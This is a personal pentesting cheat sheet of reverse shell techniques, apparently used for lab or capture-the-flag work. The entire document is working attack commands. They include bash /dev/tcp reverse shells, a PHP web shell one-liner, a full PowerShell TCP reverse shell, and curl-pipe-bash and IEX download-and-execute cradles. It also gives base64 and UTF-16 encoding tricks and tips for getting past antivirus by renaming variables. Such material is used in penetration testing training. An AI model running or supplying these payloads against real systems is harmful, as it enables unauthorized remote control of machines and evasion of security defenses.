# Reverse Shells - Examples

https://www.revshells.com/

# Test that we can rev shell

	Before trying to get a rev shell, we might want to try a ping <ip> into a tcp dump or a uname -a | nc <ip> <port>, to see if we actually get a callback

## Bash

	bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1

	if the shell being used is dash and not bash (check by doing ls -la /bin/sh)

	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
	To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash, then you can use bash -c "<cmd>" to force the bash

## Web shells

Find web shells in :

/usr/share/laudanum

### PHP

	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

One liner:

	echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

## Fully interactive shell

In the reverse shell write

	python3 -c 'import pty;pty.spawn("/bin/bash")'

Put nc in the background by pressing CTRL+Z
then write

	stty raw -echo; fg;
	export TERM=xterm

You can also forward config the shell:

	export TERM=xterm-256color
	stty rows 67 columns 318

## Powershell

Save a powershell from https://www.revshells.com/ to a file. Start the netcat listener and a http server in the dir of the revshell we just saved.
Download and execute the shell with this one liner:

	powershell.exe -c iex (iwr -UseBasicParsing http://10.10.14.119:8000/my_ps_shell.ps1)

### Another Powershell One Liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Tips

Ugrading the the reverse shell we got

	script /dev/null -c bash

Download reverse shell file and imediately execute it

	curl 'http://10.10.16.20:2020/test.sh'|bash

Convert shell to base64 when sending it through http:

	echo -n 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' | base64 -w0
	YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0IDA+JjE=

	To get rid of the special characters like the plus sign just add double splaces:

	echo -n 'bash  -i  >&  /dev/tcp/10.10.14.93/4444  0>&1'
	YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0ICAwPiYx

	Then when sending the payload do:
	echo -n YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45My80NDQ0ICAwPiYx | base64 -d | bash

	Try something but with 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'

If the process of our shell is being killed by the target host, we can try creating in a new process:

	'nohup bash -c " bash -i >& /dev/tcp/ip/port 0>&1" &'

## Windows Reverse shells

Download nishang powershell:

	git clone https://github.com/samratashok/nishang.git

Copy the desired rev shell to your webserver directory:

	cp nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 <webserver_path>/rev_shell.ps1

Delete the comments on the rev shell and change the ip and port to your localhost ip and netcat port. When starting the netcat use the rlwrap utility so that we have access to the up and down arrows for command history:

	rlwrap nc -nvlp 5555
	https://github.com/hanslub42/rlwrap.git

Now to download the rev_shell to the remote host we are gonna use a web cradle. The importance of this is that it something goes wrong and the antivirus blocks or connections, the web cradle helps determine what went wrong.

	IEX(New-Object Net.WebClient).downloadString('http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1')
	https://github.com/Andre92Marcos/myScripts/blob/main/web_cradle.ps1

If the web cradle does not reach our web server, we know that very likely the antivirus is blocking us from downloading the rev shell. Otherwise it problably is blocking the rev shell execution itself.

We change the relevant information in the web_cradle and next we are going to convert the web cradle to utf-16 little endian and then to base 64:

	cat web_cradle.ps1 | iconv -t utf-16le | base64 -w0

The reaseon we are converting to utf-16le is for Windows compability.

And finally we powershell the base64 string in the remote host:

	poweshell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOgA4ADAAMAAwAC8AcgBlAHYAXwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=

If we get a hit on the webserver trying to download the shell, but don't get the shell on the nc we know that the web cradle is working but the antivirus is blocking the rev shell. If this happens try changing the cradle to:

	IEX(IWR -UseBasicParsing http://<web_server_ip>:<web_servber_port>/<rev_shell_name>.ps1)

And then change the var names in the rev shell script (already done in this shell):

	https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_anti_virus.ps1


## Resources

https://security-tips.vincd.com/reverse-shell/

https://github.com/samratashok/nishang